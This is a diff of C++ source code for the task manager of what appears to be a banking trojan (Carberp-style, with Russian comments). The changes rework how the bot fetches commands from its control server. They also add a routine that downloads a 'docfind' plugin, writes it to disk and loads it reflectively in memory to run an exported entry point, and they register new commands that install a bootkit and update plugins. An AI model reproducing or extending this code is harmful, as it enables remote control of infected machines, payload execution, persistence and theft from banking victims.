@@ -327,7 +327,6 @@ bool TaskManagerSleep(PTaskManager Manager)
 //	return true;
 //}
 
-
 //----------------------------------------------------------------------------
 
 void StopTaskManager(PTaskManager Manager)
@@ -360,11 +359,13 @@ void StopTaskManager(PTaskManager Manager)
 }
 //----------------------------------------------------------------------------
 
-bool DownloadCommand(PCHAR aURL, PCHAR *HTMLCode)
+bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
 {
 	// Загрузить команду/ набор команд
+	bool GenerateURL = STR::IsEmpty(URL);
 
-	string URL = (!STR::IsEmpty(aURL)) ? string(aURL) : GetBankingScriptURL(SCRIPT_TASK, true);
+	if (GenerateURL)
+		URL = GetBotScriptURL(SCRIPT_TASK);
 
 	string BotID = GenerateBotID2(GetPrefix(true));
 
@@ -378,7 +379,7 @@ bool DownloadCommand(PCHAR aURL, PCHAR *HTMLCode)
 
 	#ifdef CryptHTTPH
 		PCHAR Password = GetMainPassword();
-		bool Result = CryptHTTP::Post(URL.t_str(), Password, Fields, HTMLCode, &Response);
+		bool Result = CryptHTTP::Post(URL, Password, Fields, HTMLCode, &Response);
         STR::Free(Password);
 	#else
     	bool Result = HTTP::Post(URL, Fields, HTMLCode, &Response);
@@ -403,6 +404,10 @@ bool DownloadCommand(PCHAR aURL, PCHAR *HTMLCode)
 
     HTTPResponse::Clear(&Response);
 	Strings::Free(Fields);
+
+
+	if (GenerateURL)
+		STR::Free(URL);
 
     return Result;
 }
@@ -577,6 +582,14 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command);
 
 bool ExecuteCommand(LPVOID Manager, PCHAR Command, PCHAR Args, bool Deferred)
 {
+	TASKDBG("Task", "ExecuteCommand: manager=0x%X command='%s' args='%s' defered=%d", 
+		Manager,
+		((Command == NULL) ? "(null)":Command),
+		((Args == NULL) ? "(null)":Args),
+		Deferred
+		);
+
+
 	// Выполнить команду Command с аргументами Args
 	// В случае если Deferred == true выполнение команды будет передано
 	// В поток выполнения
@@ -592,6 +605,8 @@ bool ExecuteCommand(LPVOID Manager, PCHAR Command, PCHAR Args, bool Deferred)
 
 	// Определяем метод команды
 	TCommandMethod Method = GetCommandMethod(M, Command);
+
+	TASKDBG("Task", "ExecuteCommand: GetCommandMethod return 0x%X", Method);
 	if (Method == NULL)
 		return false;
 
@@ -729,18 +744,39 @@ bool ExecuteLoadDLLDisk(PTaskManager, PCHAR Command, PCHAR Args)
 
 bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
 {
+	typedef BOOL (WINAPI *typeBuildStubDllMain)(HANDLE DllHandle, DWORD Reason, LPVOID );
 	BYTE* data = 0;
 	DWORD size = 0;
 	data = Plugin::Download( "docfind.plug", 0, &size, false );
 	bool res = false;
-	TASKDBG( "-----------", "1" );
 	if( data )
 	{
-		TASKDBG( "-----------", "2" );
+		TASKDBG( "----", "0" );
 		File::WriteBufferA( "c:\\docfind.plug", data, size );
+		HMEMORYMODULE module = MemoryLoadLibrary(data);
+		TASKDBG( "----", "01" );
+		if( module )
+		{
+			TASKDBG( "----", "1" );
+			DWORD* gAltEPOffs = (DWORD*) MemoryGetProcAddress( module, "gAltEPOffs" );
+			if( gAltEPOffs )
+			{
+				TASKDBG( "----", "2" );
+				typeBuildStubDllMain func = (typeBuildStubDllMain)gAltEPOffs[0];
+				if( func )
+				{
+					TASKDBG( "----", "3" );
+					HANDLE hEvent = pCreateEventA( NULL, FALSE, FALSE, "Global\\_SearchComplete32" );
+					func( 0, DLL_PROCESS_ATTACH, 0 );
+					DWORD dwWait = (DWORD)pWaitForSingleObject( hEvent, INFINITE );
+					pCloseHandle(hEvent);
+					TASKDBG( "----", "4" );
+				}
+			}
+			MemoryFreeLibrary(module);
+		}
 		MemFree(data);
 	}
-	TASKDBG( "-----------", "3" );
 	return res;
 }
 
@@ -831,7 +867,8 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 							(PCHAR)CommandAlert,
 							(PCHAR)CommandUpdateHosts,
 							(PCHAR)CommandLoadDLLDisk,
-							(PCHAR)CommandDocFind );
+							(PCHAR)CommandDocFind
+						  );
 
 
 	switch (Index)
@@ -867,6 +904,12 @@ void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 {
 
 	// Регистрируем известные команды бота
+
+	// Команда установки Bootkit из плага
+	RegisterCommand(Manager, (PCHAR)Plugin::CommandInstallBk, Plugin::ExecuteInstallBk);
+
+	// Команда обновления плага
+	RegisterCommand(Manager, (PCHAR)Plugin::CommandUpdatePlug, Plugin::ExecuteUpdatePlug);
 
 	// Команда grabber
 	#ifdef GrabberH
@@ -931,4 +974,3 @@ void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 		RegisterCommand(Manager, (PCHAR)DeletePath, ExecuteDeletePathCommand);
 	#endif
 }
-
